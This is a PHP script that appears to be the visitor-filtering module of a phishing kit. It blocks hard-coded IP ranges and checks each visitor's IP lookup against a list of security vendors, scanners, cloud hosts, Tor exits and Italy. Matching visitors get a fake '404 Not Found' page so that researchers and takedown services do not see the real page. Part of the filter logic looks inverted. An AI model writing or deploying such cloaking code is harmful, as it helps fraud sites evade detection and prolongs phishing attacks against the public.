<?php
$ipstart = array(
"217.61.96.0",
"104.132.20.72",
"185.22.216.0",
"178.213.64.0",
"54.208.0.0",
"193.200.150.0",
"14.140.80.178",
"66.102.8.0",
"185.75.141.32",
"83.31.40.0",
"54.183.0.0",
"81.161.59.0",
"4.14.64.0",
"139.59.0.0",
"83.31.197.0",
"146.112.209.0",
"37.187.172.0",
"77.40.129.0",
"66.249.93.88",
"54.156.0.0"
);
$ipend = array(
"217.61.103.255",
"104.132.20.79",
"185.22.219.255",
"178.213.66.41",
"54.211.255.255",
"193.200.150.255",
"14.141.1.26",
"66.102.8.137",
"185.75.141.39",
"83.31.41.255",
"54.183.255.255",
"81.161.59.255",
"4.14.65.255",
"139.59.8.35",
"83.31.197.0",
"146.112.240.255",
"37.187.173.255",
"77.40.132.127",
"66.249.93.202",
"54.167.255.255"
);

function ipbetweenrange($needle, $start, $end) {
	foreach($start as $key => $star){
	  if((ip2long($needle) >= ip2long($star)) && (ip2long($needle) <= ip2long($end[$key]))) {
		return true;
	  }
	}
  return false;
}
function getData($ip){
$curl = curl_init();
curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => "https://ip.nf/$ip.json?callback=jQuery_12345",
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'
	
));
//curl_setopt(curl);

$resp = curl_exec($curl);
$ipDetails = json_decode($resp,true);
$returned_res = $resp ;
$blocked_words = array("Aruba","TIME","Digital Ocean","1and1","1und1.de","aruba","OVH","beget","drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
 foreach($blocked_words as $word) {
     if (strrpos(strtoupper($returned_res), strtoupper($word)) ) {
         return false;

     }
 }
 
 if(strrpos($returned_res, "Italy")){
     return false ;
     
 }else return true ;
//echo $ipDetails ;
}

$ip = $_SERVER['REMOTE_ADDR'];

if(getData($ip) || ipbetweenrange($ip, $ipstart, $ipend)){
	header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
		exit;
}